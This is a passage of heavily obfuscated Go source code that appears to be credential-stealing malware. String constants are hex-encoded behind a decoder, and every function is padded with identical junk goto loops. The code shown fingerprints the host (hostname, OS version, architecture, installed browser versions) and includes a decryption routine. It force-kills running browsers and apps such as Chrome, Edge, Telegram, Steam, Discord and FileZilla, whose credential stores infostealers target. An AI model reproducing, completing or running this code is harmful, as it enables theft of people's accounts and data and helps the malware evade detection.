					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	cmd := exec.Command(Cijosgmviuhoepbatohaaytukfezbopl("930f08729cefa0bd3ce5aa34d5368f13166a0f402943e6aeaf4b"), Cijosgmviuhoepbatohaaytukfezbopl("ce23107a83fda6bc495a19ac3d936b6eedc4927b79d6741e"), fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("cb271a63c3d5bcbd3da9897c08d1c0ea1af4763d1994498ca75be67c47c0f19f1f9c4ed7ac612323c134499cd28fe8143048773420eaad"), executablePath))

	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("8501167b8bf8e8ac3fa9cb211e959cb029b15421079e5596a158e53e21caf297249852c0ff2e6848e25afa130af8d69ad9b60add3a269258"), err)
	}

	version := strings.TrimSpace(string(output))

	if version == "" {
		return "Unknown version", nil
	}

	return version, nil
}
func ghbzaekmctadqufbyhgoxxckhrjzzmpx(browserPaths [][]string) []string {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	var browserVersions []string

	for _, browser := range browserPaths {
		browserDir := browser[0]
		browserName := browser[1]

		browserExec := filepath.Join(browserDir)

		if _, err := os.Stat(browserExec); err == nil {

			version, err := ennjtfnaktnhiqfklhebulxfnoofipdv(browserExec)
			if err == nil {

				browserVersions = append(browserVersions, fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("c6135f3aceeaadaa23e0c13741d6ccb79266965f060309bec938026bec34fcc1"), browserName, version))
			}
		}
	}

	return browserVersions
}
func cuwuwomsnolbfmlybrlgqzwverlxqzbp(browserPaths [][]string) []string {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	var browserVersions []string

	for _, browser := range browserPaths {
		browserExec := browser[0]
		browserName := browser[1]

		if _, err := os.Stat(browserExec); err == nil {

			version, err := leydzhpraautvyesndmjnpembmusdfox(browserExec)
			if err == nil {

				browserVersions = append(browserVersions, fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("c6135f3aceeaadaa23e0c13741d6ccb79266965f060309bec938026bec34fcc1"), browserName, version))
			}
		}
	}

	return browserVersions
}
func yuahgibmtysvdsjbmgfzzhuadxqfnsky() (string, error) {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	hostname, err := os.Hostname()
	if err != nil {
		return "", err
	}
	return hostname, nil
}
func xitkregjmufazcgmrndkoppvsuimfvxp() (string, error) {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	if runtime.GOOS != "windows" {
		return "", fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("93032b6e9ef9e8bb386815d05b9e087fdbb1703c914084e5bd4f4af86f89ca93279d53d3b6cefc9c321e4a952e3d7f87f8731fd8eb"))
	}
	captionOutput, err := exec.Command(Cijosgmviuhoepbatohaaytukfezbopl("940d1674eb58ad83dde1dc0aecf28d0d9a876acd"), Cijosgmviuhoepbatohaaytukfezbopl("8c133ed87e6ce53c35fb3ce71db8fef71096"), Cijosgmviuhoepbatohaaytukfezbopl("84050b0b9c0f717efb3ae6c794837febac82ff"), Cijosgmviuhoepbatohaaytukfezbopl("a0010f6387f3a627c0ec3cc18f003e0daf33191ab05047")).Output()
	if err != nil {
		return "", err
	}
	versionOutput, err := exec.Command(Cijosgmviuhoepbatohaaytukfezbopl("940d1674eb58ad83dde1dc0aecf28d0d9a876acd"), Cijosgmviuhoepbatohaaytukfezbopl("8c133ed87e6ce53c35fb3ce71db8fef71096"), Cijosgmviuhoepbatohaaytukfezbopl("84050b0b9c0f717efb3ae6c794837febac82ff"), Cijosgmviuhoepbatohaaytukfezbopl("b5050d6487f3a615195d8ed59056c4822ca78cdd42f7d2")).Output()
	if err != nil {
		return "", err
	}
	caption := strings.Split(strings.TrimSpace(string(captionOutput)), Cijosgmviuhoepbatohaaytukfezbopl("e9318a2e3786fdb4f942fb63af5ade47d2"))[1]
	version := strings.Split(strings.TrimSpace(string(versionOutput)), Cijosgmviuhoepbatohaaytukfezbopl("e9318a2e3786fdb4f942fb63af5ade47d2"))[1]

	osType := fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("c6135f329d6077b980608b6dbe5373072a645eed19"), strings.TrimSpace(caption), strings.TrimSpace(version))
	osType = strings.Join(strings.Fields(osType), Cijosgmviuhoepbatohaaytukfezbopl("c3a7325d85491875a66471d88470eed6e0"))

	return osType, nil
}
func hfuhbaosozeaxoxcbnwrkovegztcfxot() string {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	return runtime.GOARCH
}
func qukwtayjhqzwebfdirhfphbahmydsmcj() string {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	return filepath.Dir(os.Args[0])
}
func mthjurlhdjgzqjaxjbzbtoresngvatir(data, key string) (string, error) {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	if key == "" {
		return "", errors.New(Cijosgmviuhoepbatohaaytukfezbopl("87051c6597ecbcb13fe78e321e8fc9a72dff6a2104db45a0e958e42275d0ad238e721f34d7932c001ed92625aa4d"))
	}
	decodedData, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return "", err
	}

	keyLength := len(key)
	dataLength := len(decodedData)
	decryptedData := make([]byte, dataLength)
	{
		goto LOOP_INIT_kxrrco
	LOOP_INIT_kxrrco:
		;

		i := 0
		goto LOOP_COND_okbsfg
	LOOP_COND_okbsfg:
		if i < dataLength {
			goto LOOP_BODY_mkhcsf
		} else {
			goto LOOP_END_sikihj
		}
	LOOP_BODY_mkhcsf:
		{
			decryptedData[i] = byte((int(decodedData[i]) - int(key[i%keyLength]) + 256) % 256)
			i++
			goto LOOP_COND_okbsfg

		}
	LOOP_END_sikihj:
		{
		}
	}

	return string(decryptedData), nil
}
func gvgkpxdiobvdipsvzpleylzniezgvjez(message, mainPath string) error {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	credit := Cijosgmviuhoepbatohaaytukfezbopl("a20913629cf3b8b039e5cb7928828ca520f4766e5ddb4fb1bd4dfa682e86fc93258c4ecbb5662452c27f7155f477bceaa733d7db05aa6393b8c48660c853cfe6453a6fe0cee430bd103098642be18e0f3d59765c8be0fa98dfaecff138f024128a")
	message = credit + message
	filePath := filepath.Join(mainPath, Cijosgmviuhoepbatohaaytukfezbopl("8a0e1978c0e8b0ac64442b29ae99cc699da3ad47785899aa"))
	if _, err := os.Stat(mainPath); os.IsNotExist(err) {
		err := os.MkdirAll(mainPath, 0777)
		if err != nil {
			return fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("800f0a7b8abca6b724a9cd2b1e979da16cf56d3c159853aabb44b37224dfb18f314229c7e24a25f68d920ee16c46"), err)
		}
	}
	err := os.WriteFile(filePath, []byte(message), 0644)
	if err != nil {
		return fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("800f0a7b8abca6b724a9d92b12828ce438fe2428199742ffe918fff42987980f57b2cb3522749a7128d6a5"), err)
	}

	return nil
}
func vmkqmfmumrbafwxzglhqlqoflbfgmyia(src, dst string) error {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destinationFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destinationFile.Close()

	_, err = destinationFile.ReadFrom(sourceFile)
	return err
}
func fmfziqwxjqnmjgitvxuhtsfchjrycrec(src, dst string) error {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destinationFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destinationFile.Close()

	_, err = io.Copy(destinationFile, sourceFile)
	return err
}
func ojtayxjnxfewtpucaoddextylyogbwil(src, dst string) error {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())

		if entry.IsDir() {
			if err := os.MkdirAll(dstPath, 0777); err != nil {
				return err
			}
			if err := ojtayxjnxfewtpucaoddextylyogbwil(srcPath, dstPath); err != nil {
				return err
			}
		} else {
			if err := vmkqmfmumrbafwxzglhqlqoflbfgmyia(srcPath, dstPath); err != nil {
				return err
			}
		}
	}

	return nil
}
func inyizexmjelataluulqnxtyriuqnjrdn() {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	browsersProcess := []string{"chrome.exe", "filezilla.exe", "msedge.exe", "watcher.exe", "opera.exe", "brave.exe", "steam.exe", "RiotClientServices.exe", "Telegram.exe"}
	additionalProcesses := []string{"discord.exe"}
	tasks, err := exec.Command(Cijosgmviuhoepbatohaaytukfezbopl("97010c7c82f5bbace54d136319f149a867e10ab0b9e7b296")).Output()
	if err != nil {
		return
	}
	tasksStr := string(tasks)
	for _, process := range browsersProcess {
		if strings.Contains(tasksStr, process) {
			err := exec.Command(Cijosgmviuhoepbatohaaytukfezbopl("97010c7c85f5a4b43da7a491ba46f2e0a5fbdb447b8b9f11"), Cijosgmviuhoepbatohaaytukfezbopl("cc2932c74ad3b82ef5f945e50b301480364da7"), process, Cijosgmviuhoepbatohaaytukfezbopl("cc26755f1246d5b9326e91c18c615b3abc45")).Run()
			if err != nil {
			}
		}
	}
	for _, process := range additionalProcesses {
		if strings.Contains(tasksStr, process) {
			err := exec.Command(Cijosgmviuhoepbatohaaytukfezbopl("97010c7c85f5a4b43da7a491ba46f2e0a5fbdb447b8b9f11"), Cijosgmviuhoepbatohaaytukfezbopl("cc26755f1246d5b9326e91c18c615b3abc45"), Cijosgmviuhoepbatohaaytukfezbopl("cc34206e3cac24a48b18dc0fd3952428a1a3"), Cijosgmviuhoepbatohaaytukfezbopl("cc2932c74ad3b82ef5f945e50b301480364da7"), process).Run()
			if err != nil {
			}
		}
	}
}
func qkamlsquwogvygfpvwitbihzlxysmzyp(hexStr string) ([]byte, error) {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	if _, err := hex.DecodeString(hexStr); err != nil {
		return nil, fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("8a0e0f629abcbbac22e0c03e5b9b9cb738b1662b509342bda859ec3168c4fc967f74c6f1d6187e96ff28934c59055c41"))
	}
	return hex.DecodeString(hexStr)
}
func bzslcmrplacwbqjtswbnkdimofgxiiib(hexString string) (string, error) {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
